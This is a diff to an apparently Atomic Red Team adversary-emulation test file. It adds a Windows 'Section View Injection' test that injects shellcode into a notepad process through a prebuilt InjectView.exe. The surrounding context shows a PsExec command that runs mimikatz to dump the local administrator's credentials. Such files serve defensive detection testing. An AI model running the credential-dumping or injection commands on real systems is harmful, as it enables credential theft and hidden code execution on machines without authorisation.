@@ -95,3 +95,16 @@ atomic_tests:
       #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
     name: command_prompt
     elevation_required: false # locally not, but remotely on target machine then yes
+- name: Section View Injection
+  description: | 
+    This test creates a section object in the local process followed by a local section view.
+    The shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. 
+    A thread is then created in the target process, using the remote section view as start address.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $notepad = Start-Process notepad -passthru
+      Start-Process $PathToAtomicsFolder\T1055\bin\x64\InjectView.exe
+    cleanup_command: Stop-Process $notepad.pid
+    name: powershell
